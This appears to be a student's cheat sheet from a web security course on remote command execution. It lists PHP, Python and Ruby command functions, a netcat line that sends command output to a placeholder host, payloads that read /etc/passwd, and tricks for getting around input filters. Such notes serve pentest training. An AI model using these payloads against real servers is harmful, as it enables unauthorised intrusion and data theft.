# RCE

## Principe

* J'ignore si l'abréviation RCE correspond à _Remote Code Execution_ ou _Remote Command Execution_, les deux étaient utilisés pour le même genre de failles dans le cours.
* Possibilité d'exécuter des commandes de l'OS sur le serveur.

## Language specifics to run commands

* PHP
  * `system("command")`
* Python
  * `os.system("command")` and variants
  * Do that inside an `str()`
  * If you need to import os.system, use this function in str\(\) : `__import__('os').system(...)`
* Ruby
  * `command`

## General tips & trick

* A basic OS command for test is `uname` \(but i suppose it would work only on a linux system\)
* Si le résultat n'est pas reflété, utiliser à la place `sleep 10` pour voir si la commande a bien été injectée
  * To send back result when it's not reflected, simply pipe it to nc : `whoami | nc <ip> <port>` \(given that the remote server has nc of course\)
* When your payload is included inside a string, **use concatenation** : `" . system('cat /etc/passwd') ."`
* Don't forget to **urlencode**
* If some characters seems to be sanitized when the request first arrive, try to base64 encode them. Since the code you inject is executed, you can make the server decode it the moments it uses it.
* Bypass sanitation :
  * If the `/` is sanitize, you can usually get it by echoing the home directory `echo $HOME`
  * Si un autre caractère est sanitize et qu'il existe dans une variable d'env, on peut faire ça :
    * `echo ${ENV:13:1}` Le 1er nombre étant la position du char et le second le nombre à récupérer. Remplacer ENV par le nom de var d'env bien sûr
  * On peut aussi utiliser `printf "\x41"` en remplacer 41 par le nombre hexa correspondant

## PHP specific tips and tricks

* If you've got input reflected into the html page, try to inject `<?php phpinfo(); ?>`
* Try to get warnings instead of errors as they won't stop the execution flow
* PHP source code is available, which is useful to see how you can break out of a function
* In php, dev usually sort either by using sql's `order by` or php's `usort`. And in usort, they often used a function created with `create_function` \(however it's now deprecated\)
  * In an example using usort and then create\_function, the easiest is to try and break out create\_function, even more so since we can have it's source code. This is the pentesterlab payload that would break it \(Essential - Code Execution 2\) : `?order=id);}system('cat /etc/passwd');//`. I thinks that stems from the fact that it's used in a `sprintf` as a `%s`.
* It's been deprecated in 5.5 and removed in 7, but you could use the regex modifier `/e` to make `preg_replace` evaluate the replacement before using it :  `www.example.com/?replacement=phpinfo()&pattern=/hello/e&base=hello`

## Sources

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* PwnFunction's [video](https://www.youtube.com/watch?v=jkJWA_CWrQs)
* Misc Research

